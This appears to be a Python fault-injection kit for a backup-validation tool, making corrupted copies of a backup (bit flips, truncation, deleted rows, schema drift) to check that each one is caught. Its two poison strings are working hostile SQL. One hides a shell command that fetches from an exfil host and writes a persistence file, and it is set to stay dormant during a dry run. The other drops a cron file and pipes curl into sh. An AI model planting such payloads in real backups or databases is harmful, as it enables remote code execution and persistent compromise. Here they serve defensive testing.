"""Fault-injection kit: proves RestoreGuard catches what breaks real backups.

Jonas's step 7 ("test if it works, schema change, bit flips etc."). Each fault
is a copy of one good backup (the original is never touched) with its own
manifest, named like a real backup so the copies can also be dropped into a
watched folder and shown in the UI. Corruptions get a re-signed manifest,
because a checksum only catches damage after the backup job hashed the file;
the re-signed copies show the deeper checks catching it anyway. The poisoned
copy is built so its payload stays quiet in the builder (it fires only outside
a database named "build", on the first customers row loaded), the way a real one would hide from a dry run.

  python faults.py <good backup.dump | good Frappe backup.sql.gz> [--out DIR] [--make-only]

Without --make-only every fault runs through guard.run_cell on every app
version (frappe_target.run_cell for a Frappe backup; none of its faults gets
past the sandbox, so none reaches test.local) and a table shows what caught
it; exit 1 if any fault slipped through.
"""
import argparse
import asyncio
import gzip
import json
import re
import shutil
import sys
from pathlib import Path

import frappe_target
import guard

HERE = Path(__file__).resolve().parent
POISON = """CREATE FUNCTION nv_audit(i integer) RETURNS integer LANGUAGE plpgsql AS $f$
BEGIN
  IF current_database() <> 'build' AND i = 1 THEN
    COPY (SELECT 1) TO PROGRAM 'wget -O- http://exfil.nordvik-backup.net/k; echo x > /etc/nv-persist';
  END IF;
  RETURN i;
END $f$;
ALTER TABLE customers ADD CONSTRAINT customers_audit CHECK (nv_audit(id) = id);
"""
# name: (what is done, what must happen)
FAULTS = {
    "bitflip-stale": ("16 bytes flipped at 3 offsets, manifest untouched", "not restorable"),
    "bitflip": ("16 bytes flipped at 3 offsets, manifest re-signed", "not restorable"),
    "truncated": ("dump cut at 60 %, manifest re-signed", "not restorable"),
    "rows-deleted": ("all payments rows deleted, manifest re-signed", "not restorable"),
    "schema-v2": ("migration 002 applied, honest v2 manifest", "drift caught, DR ready"),
    "poisoned": ("a CHECK constraint calls a function that runs a shell command", "quarantined"),
}
FRAPPE_POISON = ("SELECT 'x' INTO OUTFILE '/etc/cron.d/rg-persist';\n"
                 "\\! curl -s http://exfil.nordvik-backup.net/k | sh\n")
FRAPPE_FAULTS = {
    "bitflip-stale": ("16 bytes of the .sql.gz flipped at 3 offsets, manifest untouched", "not restorable"),
    "bitflip": ("16 bytes of the .sql.gz flipped at 3 offsets, manifest re-signed", "not restorable"),
    "truncated": (".sql.gz cut at 60 %, manifest re-signed", "not restorable"),
    "truncated-sql": ("SQL cut at 60 % and gzipped cleanly, manifest re-signed", "not restorable"),
    "rows-deleted": ("all Demo Service Request rows deleted, manifest re-signed", "not restorable"),
    "rule-broken": ("total_cost of every Demo Service Request x10, manifest re-signed", "not restorable"),
    "poisoned": ("INTO OUTFILE into /etc/cron.d and a client shell escape", "quarantined"),
}


def _flip(data):
    data = bytearray(data)
    for frac in (0.55, 0.7, 0.85):
        at = int(len(data) * frac)
        data[at:at + 16] = bytes(b ^ 0xFF for b in data[at:at + 16])
    return bytes(data)


def _write(out, stem, data, manifest, resign=True, ext=".dump"):
    dump = out / f"{stem}{ext}"
    dump.write_bytes(data)
    m = dict(manifest, file=dump.name)
    if resign:
        m["sha256"] = guard.sha256_file(dump)
    (out / f"{stem}.json").write_text(json.dumps(m))
    return dump


def _scale_column(sql, table, column, factor):
    """Multiply one numeric column of every row in a mysqldump INSERT block of `table`."""
    create = re.search(rf"CREATE TABLE `{re.escape(table)}` \((.*?)\n\)", sql, re.S)[1]
    at = re.findall(r"^  `(\w+)`", create, re.M).index(column)
    value = re.compile(r"'(?:[^'\\]|\\.)*'|NULL|-?[\d.]+")

    def row(m):
        vals = value.findall(m[1])
        vals[at] = repr(float(vals[at]) * factor)
        return f"({','.join(vals)}){m[2]}"
    head = f"INSERT INTO `{table}` VALUES\n"
    start = sql.index(head) + len(head)
    end = sql.index(";\n", start) + 2
    return sql[:start] + re.sub(r"^\((.*)\)([,;])$", row, sql[start:end], flags=re.M) + sql[end:]


def _frappe_faults(src):
    """name -> function making that fault's bytes, so one fault can be made without the others."""
    raw = Path(src).read_bytes()
    sql = gzip.decompress(raw).decode()
    table = f"tab{frappe_target.config()['doctype']}"
    insert = re.compile(rf"^INSERT INTO `{re.escape(table)}` VALUES\n.*?;\n", re.M | re.S)
    header_end = sql.index("\n\n", sql.index("enable the sandbox mode")) + 2
    return {"bitflip-stale": lambda: _flip(raw),
            "bitflip": lambda: _flip(raw),
            "truncated": lambda: raw[:int(len(raw) * 0.6)],
            "truncated-sql": lambda: gzip.compress(sql[:int(len(sql) * 0.6)].encode()),
            "rows-deleted": lambda: gzip.compress(insert.sub("", sql, count=1).encode()),
            "rule-broken": lambda: gzip.compress(_scale_column(sql, table, "total_cost", 10).encode()),
            "poisoned": lambda: gzip.compress((sql[:header_end] + FRAPPE_POISON + sql[header_end:]).encode())}


def make_frappe(src, out):
    backup = frappe_target.load_backup(src)
    m, base = backup["manifest"], backup["id"][:-len("-database")]
    out.mkdir(parents=True, exist_ok=True)
    return {f: _write(out, f"{base}-{f}-database", make(), m, f != "bitflip-stale", ext=".sql.gz")
            for f, make in _frappe_faults(src).items()}


def inject(backup, fault, out, stem, manifest):
    """One fault on one backup for the console's Run, without a sandbox (so it never waits for a running cell):
    Frappe faults are made from the file, a Postgres fault that needs a rebuild comes from the kit's copy of
    that backup. `manifest` is written re-signed next to the copy, last."""
    if backup.get("kind") == "frappe":
        data, ext = _frappe_faults(backup["path"])[fault](), ".sql.gz"
    else:
        raw, ext = Path(backup["path"]).read_bytes(), ".dump"
        made = {"bitflip": lambda: _flip(raw), "truncated": lambda: raw[:int(len(raw) * 0.6)]}
        kit = HERE / "faults" / "out" / backup["id"].replace("_v", f"-{fault}_v", 1)
        if fault in made:
            data = made[fault]()
        elif kit.with_suffix(".dump").exists():
            data = kit.with_suffix(".dump").read_bytes()
        else:
            raise ValueError(f"no {fault} copy of {backup['id']} in the fault kit (python faults.py {backup['file']} --make-only)")
    return _write(out, stem, data, manifest, ext=ext)


async def _rebuild(backup, sql, recount):
    """Restore the backup in a sandbox, run `sql`, dump it again. Returns (dump bytes, manifest stats or None)."""
    cell = guard.Cell(backup, {"version": "build"}, lambda ev: None)
    lock = await asyncio.to_thread(guard._sandbox_lock)
    try:
        async with guard.Sandbox(cell) as sb:
            await sb.exec("createdb", "-h", "/var/run/postgresql", "-U", "postgres", "build")
            rc, _, err = await sb.exec("pg_restore", "--exit-on-error", "--no-owner", "-h", "/var/run/postgresql",
                                       "-U", "postgres", "-d", "build", "/input/backup.dump", timeout=150)
            if rc != 0:
                raise RuntimeError(f"source backup does not restore: {err[-300:]}")
            rc, _, err = await sb.psql(sql, db="build")
            if rc != 0:
                raise RuntimeError(f"fault SQL failed: {err[-300:]}")
            stats = json.loads((await sb.psql(guard.MANIFEST_SQL, db="build"))[1]) if recount else None
            rc, data, err = await guard.docker("exec", sb.name, "pg_dump", "-Fc", "-h", "/var/run/postgresql",
                                               "-U", "postgres", "build", timeout=120)
            if rc != 0:
                raise RuntimeError(f"pg_dump failed: {err.decode(errors='replace')[-300:]}")
            return data, stats
    finally:
        lock.close()


async def make(src, out):
    backup = guard.load_backup(src)
    m, v = backup["manifest"], backup["manifest"]["schema_version"]
    ts = backup["id"].rsplit("_v", 1)[0]
    raw = Path(src).read_bytes()
    out.mkdir(parents=True, exist_ok=True)
    made = {"bitflip-stale": _write(out, f"{ts}-bitflip-stale_v{v}", _flip(raw), m, resign=False),
            "bitflip": _write(out, f"{ts}-bitflip_v{v}", _flip(raw), m),
            "truncated": _write(out, f"{ts}-truncated_v{v}", raw[:int(len(raw) * 0.6)], m)}
    data, _ = await _rebuild(backup, "DELETE FROM payments;", recount=False)
    made["rows-deleted"] = _write(out, f"{ts}-rows-deleted_v{v}", data, m)
    if v == 1:
        migration = (HERE / "standin" / "migrations" / "002_split_customer_name.sql").read_text()
        data, stats = await _rebuild(backup, migration, recount=True)
        made["schema-v2"] = _write(out, f"{ts}-schema-v2_v2", data, {**m, **stats, "app_version": "2.0.0"})
    data, _ = await _rebuild(backup, POISON, recount=False)
    made["poisoned"] = _write(out, f"{ts}-poisoned_v{v}", data, m)
    return made


def _verdict(fault, cells):
    states = {c["state"] for c in cells}
    if fault == "poisoned":
        return states == {"quarantined"}
    if fault == "schema-v2":
        drift = any(c["state"] == "healed" or "migrated" in c["reason"] or c["app_version"] == "1.0.0" and c["state"] == "failed"
                    for c in cells)
        return drift and bool(states & {"native", "healed"})
    return not states & {"native", "healed"}


def _caught_by(cells):
    for c in cells:
        bad = [x for x in c["checks"] if not x["pass"]]
        if c["state"] == "quarantined":
            return f"quarantine: {', '.join(c['signals']) or 'static scan'}" + (
                f" + {len(c['static_scan'])} scan finding(s)" if c["static_scan"] else "")
        if c["state"] == "healed":
            return f"drift: app {c['app_version']} refused it, GLM bridge round {c['bridges'][-1]['round']}"
        if bad:
            return bad[0]["check"]
    return "-"


async def run(made, kind=guard, targets=None, faults=FAULTS):
    rows = []
    for fault, dump in made.items():
        backup = kind.load_backup(dump)
        cells = [await kind.run_cell(backup, a) for a in targets or guard.apps()]
        ok = _verdict(fault, cells)
        rows.append((fault, faults[fault][1], " / ".join(f"{c['app_version']} {c['state']}" for c in cells),
                     _caught_by(cells), "PASS" if ok else "MISSED", cells[0]["reason"]))
        print(f"{fault}: {rows[-1][4]}", file=sys.stderr)
    widths = [max(len(r[i]) for r in rows + [("fault", "must", "result per app", "caught by", "test", "")])
              for i in range(5)]
    head = ("fault", "must", "result per app", "caught by", "test")
    for r in [head, tuple("-" * w for w in widths)] + [r[:5] for r in rows]:
        print("  ".join(c.ljust(w) for c, w in zip(r, widths)))
    print()
    for r in rows:
        print(f"{r[0]}: {r[5]}")
    return all(r[4] == "PASS" for r in rows)


def main():
    p = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    p.add_argument("backup")
    p.add_argument("--out")
    p.add_argument("--make-only", action="store_true")
    a = p.parse_args()
    frappe = a.backup.endswith(".sql.gz")
    default = HERE / "faults" / ("out-frappe" if frappe else "out")
    out = Path(a.out or default)
    if out.resolve() == default.resolve() and out.exists():
        shutil.rmtree(out)
    made = make_frappe(a.backup, out) if frappe else asyncio.run(make(a.backup, out))
    print("made:", ", ".join(d.name for d in made.values()), file=sys.stderr)
    if not a.make_only:
        ran = (run(made, frappe_target, frappe_target.targets(frappe_target.config()), FRAPPE_FAULTS) if frappe
               else run(made))
        sys.exit(0 if asyncio.run(ran) else 1)


if __name__ == "__main__":
    main()
